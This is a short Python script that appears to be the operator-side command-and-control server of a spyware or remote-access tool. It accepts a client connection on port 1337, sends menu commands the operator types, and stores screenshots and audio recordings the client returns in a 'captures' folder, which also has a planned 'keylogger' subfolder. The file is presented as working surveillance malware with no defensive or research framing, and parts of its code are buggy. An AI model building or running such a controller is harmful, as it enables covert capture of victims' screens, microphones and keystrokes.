import socket
import calendar
import time
import os

def checkPaths():
    path = os.getcwd()
    directory = "\captures"
    if(os.path.isdir(path+directory)):
        print("Ready to work")
    else:
        print("Creating paths")
        createPaths(path, directory)

def createPaths(path, directory):
    paths = ["screnshots", "audio", "keylogger"]
    os.mkdir(path+directory)
    checkPaths()

def recieveFileImage(clientsocket):
    path = os.getcwd() # Get location Path
    directory = "\captures\\" # Custom directory
    ts = path+directory+str(calendar.timegm(time.gmtime()))+".png" # Get timesmap for naming the images
    with open(ts, "wb") as f:
        print("Getting a file..")
        while True:
            data = clientsocket.recv(8192)
            if not data:
                break
            else:
                f.write(data)
        clientsocket.close()

def recieveFileAudio(clientsocket):
    path = os.getcwd() # Get location Path
    directory = "\captures\\" # Custom directory
    ts = path+directory+str(calendar.timegm(time.gmtime()))+".wav" # Get timesmap for naming the images
    with open(ts, "wb") as f:
        print("Getting a file..")
        while True:
            data = clientsocket.recv(8192)
            if not data:
                break
            else:
                f.write(data)
        clientsocket.close()


def main():
    # Set host IP and port
    host = socket.gethostname()
    port = 1337
    # Create socket object
    serversocket = socket.socket(
        socket.AF_INET, socket.SOCK_STREAM
    )
    serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Bind to the port
    serversocket.bind((host, port))
    checkPaths()

    # For this project the maximun allowed connection are 5
    print("Waiting for connections...")
    serversocket.listen(5)    
    clientsocket,addr = serversocket.accept()

    while True:
        
        data = clientsocket.recv(8192)
        print(data.decode("utf-8"))
        data = clientsocket.recv(8192)
        print(data.decode("utf-8"))

        # establish a connection
        msg = input("Enter a value: ")
        print("Got a connection from %s" % str(addr))
        clientsocket.send(msg.encode("utf-8"))
        if msg == "1":
            recieveFileImage(clientsocket)
            clientsocket,addr = serversocket.accept()

        if  msg == "4":
            recieveFileAudio(clientsocket)
            clientsocket,addr = serversocket.accept()

        if msg == "7":
            data = clientsocket.recv(8192)
            print(data.decode("utf-8"))
            msg = input()
            print("Got a connection from %s" % str(addr))
            clientsocket.send(msg.encode("utf-8"))

if __name__ == "__main__":
    main()